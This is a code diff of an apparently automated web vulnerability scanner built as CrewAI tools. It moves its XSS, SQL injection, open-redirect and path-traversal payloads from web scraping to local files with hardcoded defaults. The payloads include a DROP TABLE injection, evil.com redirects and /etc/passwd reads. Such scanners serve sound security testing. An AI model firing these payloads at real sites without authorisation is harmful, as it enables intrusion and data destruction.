@@ -8,240 +8,105 @@ import os
 from urllib.parse import parse_qs, urlparse, urljoin
 from crewai.tools import tool
 
-# Danh sách payload XSS
-XSS_PAYLOADS = [
-    '<script>alert(1)</script>',
-    '"><script>alert(1)</script>',
-    '"><img src=x onerror=alert(1)>',
-    '\'><img src=x onerror=alert(1)>',
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
-    '<iframe src="javascript:alert(1)"></iframe>'
-]
-
-# Danh sách payload SQL Injection
-SQLI_PAYLOADS = [
-    "'",
-    "''",
-    '\\\'',
-    ";",
-    "' OR '1'='1",
-    "' OR '1'='1' --",
-    "' UNION SELECT NULL--",
-    "1' ORDER BY 1--",
-    "admin' --",
-    "1'; DROP TABLE users--"
-]
-
-# Danh sách payload Open Redirect
-OPEN_REDIRECT_PAYLOADS = [
-    'https://evil.com',
-    '//evil.com',
-    '\\evil.com',
-    'javascript:alert(1)',
-    'data:text/html,<script>alert(1)</script>'
-]
-
-# Danh sách payload Path Traversal
-PATH_TRAVERSAL_PAYLOADS = [
-    '../../../etc/passwd',
-    '..\\..\\..\\windows\\win.ini',
-    '../../../etc/hosts',
-    '../../../var/log/apache2/access.log',
-    '/etc/passwd',
-    'file:///etc/passwd'
-]
-
-@tool("Payload Searcher")
-def search_payloads(vulnerability_type: str = "xss", source: str = "portswigger") -> str:
+# Helper function to load payloads from files
+def load_payloads(vulnerability_type):
     """
-    Tìm kiếm và thu thập các payload mới từ các nguồn web khác nhau.
+    Loads payloads from files in the payloads directory.
     
     Args:
-        vulnerability_type (str): Loại lỗ hổng cần tìm payload (xss, sqli, openredirect, pathtraversal, csrf)
-        source (str): Nguồn tìm kiếm (portswigger, github, hacktricks, payload-all-the-things)
+        vulnerability_type (str): Type of vulnerability (xss, sqli, openredirect, pathtraversal)
         
     Returns:
-        str: Danh sách các payload mới dạng JSON
+        list: List of payloads
     """
+    base_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "payloads")
+    
+    # Default payloads in case files are not found
+    default_payloads = {
+        "xss": [
+            '<script>alert(1)</script>',
+            '"><script>alert(1)</script>',
+            '"><img src=x onerror=alert(1)>',
+            '\'><img src=x onerror=alert(1)>',
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+            '<iframe src="javascript:alert(1)"></iframe>'
+        ],
+        "sqli": [
+            "'",
+            "''",
+            '\\\'',
+            ";",
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' UNION SELECT NULL--",
+            "1' ORDER BY 1--",
+            "admin' --",
+            "1'; DROP TABLE users--"
+        ],
+        "openredirect": [
+            'https://evil.com',
+            '//evil.com',
+            '\\evil.com',
+            'javascript:alert(1)',
+            'data:text/html,<script>alert(1)</script>'
+        ],
+        "pathtraversal": [
+            '../../../etc/passwd',
+            '..\\..\\..\\windows\\win.ini',
+            '../../../etc/hosts',
+            '../../../var/log/apache2/access.log',
+            '/etc/passwd',
+            'file:///etc/passwd'
+        ]
+    }
+    
     try:
-        vulnerability_type = vulnerability_type.lower()
-        source = source.lower()
+        payloads = []
         
-        results = {
-            "source": source,
-            "vulnerability_type": vulnerability_type,
-            "payloads": [],
-            "references": []
-        }
-        
-        # PortSwigger XSS Cheat Sheet
-        if source == "portswigger" and vulnerability_type == "xss":
-            url = "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
-            print(f"Searching for XSS payloads from {url}")
+        if vulnerability_type == "xss":
+            file_path = os.path.join(base_path, "xss", "xss_payloads.txt")
+            if os.path.exists(file_path):
+                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    payloads = [line.strip() for line in f if line.strip()]
             
-            try:
-                response = requests.get(url, timeout=10)
-                if response.status_code == 200:
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                    # Get payload examples from PortSwigger page
-                    payloads = []
-                    
-                    # Find all elements with class 'cheat-sheet-item'
-                    cheat_sheet_items = soup.find_all('section', class_='cheat-sheet-item')
-                    for item in cheat_sheet_items:
-                        code_tag = item.find('code')
-                        if code_tag:
-                            payload = code_tag.text.strip()
-                            if payload and len(payload) < 200:  # Limit length to avoid oversized payloads
-                                payloads.append(payload)
-                    
-                    if not payloads:
-                        # Fallback method: find all code tags
-                        code_tags = soup.find_all('code')
-                        for code in code_tags:
-                            code_text = code.get_text().strip()
-                            if '<' in code_text and '>' in code_text and len(code_text) < 200:
-                                payloads.append(code_text)
-                    
-                    # Filter and add up to 15 payloads
-                    payloads = list(set(payloads))[:15]
-                    results["payloads"] = payloads
-                    results["references"].append({
-                        "title": "PortSwigger XSS Cheat Sheet",
-                        "url": url
-                    })
-            except Exception as e:
-                print(f"Error searching from PortSwigger: {str(e)}")
-        
-        # HackTricks
-        elif source == "hacktricks":
-            base_url = "https://book.hacktricks.xyz"
-            url_map = {
-                "xss": "/pentesting-web/xss-cross-site-scripting",
-                "sqli": "/pentesting-web/sql-injection",
-                "openredirect": "/pentesting-web/open-redirect",
-                "pathtraversal": "/pentesting-web/file-inclusion",
-                "csrf": "/pentesting-web/csrf-cross-site-request-forgery"
-            }
+        elif vulnerability_type == "sqli":
+            sqli_files = [
+                os.path.join(base_path, "sqli", "auth_bypass_payloads.txt"),
+                os.path.join(base_path, "sqli", "error_based_payloads.txt"),
+                os.path.join(base_path, "sqli", "time_based_payloads.txt"),
+                os.path.join(base_path, "sqli", "union_based_payloads.txt")
+            ]
             
-            if vulnerability_type in url_map:
-                url = base_url + url_map[vulnerability_type]
-                print(f"Searching for {vulnerability_type} payloads from {url}")
-                
-                try:
-                    response = requests.get(url, timeout=10)
-                    if response.status_code == 200:
-                        soup = BeautifulSoup(response.text, 'html.parser')
-                        payloads = []
-                        
-                        # Find all code tags
-                        code_blocks = soup.find_all(['code', 'pre'])
-                        for block in code_blocks:
-                            code_text = block.get_text().strip()
-                            # Check if code is a potential payload
-                            if vulnerability_type == "xss" and ('<' in code_text and '>' in code_text):
-                                payloads.append(code_text)
-                            elif vulnerability_type == "sqli" and ("'" in code_text or '"' in code_text or "SELECT" in code_text.upper()):
-                                payloads.append(code_text)
-                            elif vulnerability_type == "openredirect" and ("http" in code_text or "//" in code_text):
-                                payloads.append(code_text)
-                            elif vulnerability_type == "pathtraversal" and ("../" in code_text or "..\\" in code_text):
-                                payloads.append(code_text)
-                            
-                        # Filter and limit results
-                        payloads = [p for p in payloads if len(p) < 200]
-                        payloads = list(set(payloads))[:15]
-                        results["payloads"] = payloads
-                        results["references"].append({
-                            "title": f"HackTricks {vulnerability_type.upper()} Guide",
-                            "url": url
-                        })
-                except Exception as e:
-                    print(f"Error searching from HackTricks: {str(e)}")
-        
-        # GitHub - PayloadsAllTheThings
-        elif source == "payload-all-the-things" or source == "github":
-            github_base = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master"
-            url_map = {
-                "xss": "/XSS%20Injection/README.md",
-                "sqli": "/SQL%20Injection/README.md",
-                "openredirect": "/Open%20Redirect/README.md",
-                "pathtraversal": "/Directory%20Traversal/README.md",
-                "csrf": "/CSRF%20Injection/README.md"
-            }
+            for file_path in sqli_files:
+                if os.path.exists(file_path):
+                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        payloads.extend([line.strip() for line in f if line.strip()])
             
-            if vulnerability_type in url_map:
-                url = github_base + url_map[vulnerability_type]
-                print(f"Searching for {vulnerability_type} payloads from PayloadsAllTheThings")
-                
-                try:
-                    response = requests.get(url, timeout=10)
-                    if response.status_code == 200:
-                        markdown_text = response.text
-                        payloads = []
-                        
-                        # Find code blocks in Markdown
-                        code_blocks = re.findall(r'```(?:\w+)?\n(.*?)\n```', markdown_text, re.DOTALL)
-                        for block in code_blocks:
-                            lines = block.split('\n')
-                            for line in lines:
-                                line = line.strip()
-                                if line and len(line) < 200:
-                                    # Similar filtering conditions as above
-                                    if vulnerability_type == "xss" and ('<' in line and '>' in line):
-                                        payloads.append(line)
-                                    elif vulnerability_type == "sqli" and ("'" in line or '"' in line or "SELECT" in line.upper()):
-                                        payloads.append(line)
-                                    elif vulnerability_type == "openredirect" and ("http" in line or "//" in line):
-                                        payloads.append(line)
-                                    elif vulnerability_type == "pathtraversal" and ("../" in line or "..\\" in line):
-                                        payloads.append(line)
-                                    elif vulnerability_type == "csrf" and ("<form" in line.lower() or "fetch(" in line):
-                                        payloads.append(line)
-                        
-                        # Get inline code examples
-                        inline_codes = re.findall(r'`(.*?)`', markdown_text)
-                        for code in inline_codes:
-                            if len(code) < 200:
-                                # Similar conditions as above
-                                if vulnerability_type == "xss" and ('<' in code and '>' in code):
-                                    payloads.append(code)
-                                elif vulnerability_type == "sqli" and ("'" in code or '"' in code or "SELECT" in code.upper()):
-                                    payloads.append(code)
-                                elif vulnerability_type == "openredirect" and ("http" in code or "//" in code):
-                                    payloads.append(code)
-                                elif vulnerability_type == "pathtraversal" and ("../" in code or "..\\" in code):
-                                    payloads.append(code)
-                        
-                        # Filter and limit results
-                        payloads = list(set(payloads))[:15]
-                        results["payloads"] = payloads
-                        results["references"].append({
-                            "title": "PayloadsAllTheThings GitHub Repository",
-                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings"
-                        })
-                except Exception as e:
-                    print(f"Error searching from PayloadsAllTheThings: {str(e)}")
+        elif vulnerability_type == "openredirect":
+            file_path = os.path.join(base_path, "open_redirect", "open_redirect_payloads.txt")
+            if os.path.exists(file_path):
+                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    payloads = [line.strip() for line in f if line.strip()]
+            
+        elif vulnerability_type == "pathtraversal":
+            # Assuming there's a path_traversal directory with payloads
+            file_path = os.path.join(base_path, "path_traversal", "path_traversal_payloads.txt")
+            if os.path.exists(file_path):
+                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    payloads = [line.strip() for line in f if line.strip()]
         
-        # If no payloads found, return default list
-        if not results["payloads"]:
-            if vulnerability_type == "xss":
-                results["payloads"] = XSS_PAYLOADS
-                results["note"] = "Using default payload list as no new payloads were found"
-            elif vulnerability_type == "sqli":
-                results["payloads"] = SQLI_PAYLOADS
-                results["note"] = "Using default payload list as no new payloads were found"
-            elif vulnerability_type == "openredirect":
-                results["payloads"] = OPEN_REDIRECT_PAYLOADS
-                results["note"] = "Using default payload list as no new payloads were found"
-            elif vulnerability_type == "pathtraversal":
-                results["payloads"] = PATH_TRAVERSAL_PAYLOADS
-                results["note"] = "Using default payload list as no new payloads were found"
+        # If we got payloads from files, use them
+        if payloads:
+            return payloads
         
-        return json.dumps(results, ensure_ascii=False)
+        # If no payloads from files, use defaults
+        print(f"Warning: No payload file found for {vulnerability_type}. Using default payloads.")
+        return default_payloads.get(vulnerability_type, [])
+        
     except Exception as e:
-        return json.dumps({"error": f"Error searching for payloads: {str(e)}"})
+        print(f"Error loading payloads for {vulnerability_type}: {str(e)}")
+        return default_payloads.get(vulnerability_type, [])
 
 def xss_scanner(url, params=None):
     """
@@ -254,6 +119,9 @@ def xss_scanner(url, params=None):
     Returns:
         dict: Kết quả quét XSS
     """
+    # Load XSS payloads from file with limited number
+    XSS_PAYLOADS = load_payloads("xss")
+    
     result = {
         "vulnerable": False,
         "payloads": [],
@@ -285,8 +153,13 @@ def xss_scanner(url, params=None):
         
         # Kiểm tra từng tham số
         for param_name, param_value in params.items():
+            param_vulnerable = False
             # Thử từng payload XSS
             for payload in XSS_PAYLOADS:
+                # Skip testing more payloads if we already found vulnerability in this parameter
+                if param_vulnerable:
+                    break
+                    
                 test_params = params.copy()
                 test_params[param_name] = payload
                 
@@ -296,6 +169,8 @@ def xss_scanner(url, params=None):
                     # Kiểm tra xem payload có xuất hiện nguyên vẹn trong phản hồi không
                     if payload in response.text:
                         result["vulnerable"] = True
+                        param_vulnerable = True
+                        
                         if payload not in result["payloads"]:
                             result["payloads"].append(payload)
                         
@@ -304,6 +179,10 @@ def xss_scanner(url, params=None):
                             "payload": payload,
                             "status_code": response.status_code
                         })
+                        
+                        # Đã tìm thấy lỗ hổng trong tham số này, không cần thử thêm payload
+                        print(f"Found XSS vulnerability in parameter '{param_name}' with payload: {payload}")
+                        break
                         
                 except requests.exceptions.RequestException:
                     continue
@@ -327,6 +206,9 @@ def sqli_scanner(url, params=None):
     Returns:
         dict: Kết quả quét SQL Injection
     """
+    # Load SQL Injection payloads from file with limited number
+    SQLI_PAYLOADS = load_payloads("sqli")
+    
     result = {
         "vulnerable": False,
         "payloads": [],
@@ -379,8 +261,13 @@ def sqli_scanner(url, params=None):
         
         # Kiểm tra từng tham số
         for param_name, param_value in params.items():
+            param_vulnerable = False
             # Thử từng payload SQL Injection
             for payload in SQLI_PAYLOADS:
+                # Skip testing more payloads if we already found vulnerability in this parameter
+                if param_vulnerable:
+                    break
+                    
                 test_params = params.copy()
                 test_params[param_name] = payload
                 
@@ -391,6 +278,8 @@ def sqli_scanner(url, params=None):
                     for error in sql_errors:
                         if error in response.text:
                             result["vulnerable"] = True
+                            param_vulnerable = True
+                            
                             if payload not in result["payloads"]:
                                 result["payloads"].append(payload)
                             
@@ -400,7 +289,14 @@ def sqli_scanner(url, params=None):
                                 "status_code": response.status_code,
                                 "error": error
                             })
+                            
+                            # Đã tìm thấy lỗ hổng trong tham số này, không cần thử thêm payload
+                            print(f"Found SQL Injection vulnerability in parameter '{param_name}' with payload: {payload}")
                             break
+                    
+                    # If we found SQL error, skip to next parameter
+                    if param_vulnerable:
+                        break
                         
                 except requests.exceptions.RequestException:
                     continue
@@ -424,6 +320,9 @@ def open_redirect_scanner(url, params=None):
     Returns:
         dict: Kết quả quét Open Redirect
     """
+    # Load Open Redirect payloads from file with limited number
+    OPEN_REDIRECT_PAYLOADS = load_payloads("openredirect")
+    
     result = {
         "vulnerable": False,
         "payloads": [],
@@ -461,8 +360,13 @@ def open_redirect_scanner(url, params=None):
         
         # Kiểm tra từng tham số
         for param_name, param_value in params.items():
+            param_vulnerable = False
             # Thử từng payload Open Redirect
             for payload in OPEN_REDIRECT_PAYLOADS:
+                # Skip testing more payloads if we already found vulnerability in this parameter
+                if param_vulnerable:
+                    break
+                    
                 test_params = params.copy()
                 test_params[param_name] = payload
                 
@@ -476,6 +380,8 @@ def open_redirect_scanner(url, params=None):
                         # Kiểm tra xem location có chứa payload không
                         if payload in location:
                             result["vulnerable"] = True
+                            param_vulnerable = True
+                            
                             if payload not in result["payloads"]:
                                 result["payloads"].append(payload)
                             
@@ -485,6 +391,10 @@ def open_redirect_scanner(url, params=None):
                                 "status_code": response.status_code,
                                 "location": location
                             })
+                            
+                            # Đã tìm thấy lỗ hổng trong tham số này, không cần thử thêm payload
+                            print(f"Found Open Redirect vulnerability in parameter '{param_name}' with payload: {payload}")
+                            break
                         
                 except requests.exceptions.RequestException:
                     continue
@@ -508,6 +418,9 @@ def path_traversal_scanner(url, params=None):
     Returns:
         dict: Kết quả quét Path Traversal
     """
+    # Load Path Traversal payloads from file with limited number
+    PATH_TRAVERSAL_PAYLOADS = load_payloads("pathtraversal")
+    
     result = {
         "vulnerable": False,
         "payloads": [],
@@ -553,8 +466,13 @@ def path_traversal_scanner(url, params=None):
         
         # Kiểm tra từng tham số
         for param_name, param_value in params.items():
+            param_vulnerable = False
             # Thử từng payload Path Traversal
             for payload in PATH_TRAVERSAL_PAYLOADS:
+                # Skip testing more payloads if we already found vulnerability in this parameter
+                if param_vulnerable:
+                    break
+                    
                 test_params = params.copy()
                 test_params[param_name] = payload
                 
@@ -566,6 +484,8 @@ def path_traversal_scanner(url, params=None):
                         for content in sensitive_content[payload]:
                             if content in response.text:
                                 result["vulnerable"] = True
+                                param_vulnerable = True
+                                
                                 if payload not in result["payloads"]:
                                     result["payloads"].append(payload)
                                 
@@ -575,8 +495,15 @@ def path_traversal_scanner(url, params=None):
                                     "status_code": response.status_code,
                                     "content_found": content
                                 })
+                                
+                                # Đã tìm thấy lỗ hổng trong tham số này, không cần thử thêm payload
+                                print(f"Found Path Traversal vulnerability in parameter '{param_name}' with payload: {payload}")
                                 break
                         
+                        # If we found sensitive content, skip to next parameter
+                        if param_vulnerable:
+                            break
+                            
                 except requests.exceptions.RequestException:
                     continue
                     
